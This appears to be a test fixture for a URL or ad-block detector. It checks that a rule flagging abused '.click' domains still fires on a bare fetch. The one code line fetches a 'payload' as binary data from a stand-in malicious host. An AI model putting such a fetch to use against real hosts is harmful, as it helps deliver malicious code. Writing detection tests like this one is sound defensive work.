// Bare abused-TLD navigation: no filter syntax, no blocklist context.
// The tld-click leg must keep firing here after the fork-list carve-out.
var u = "http://evilad.tracksafe.click/payload";
fetch(u).then(function (r) { return r.arrayBuffer(); });
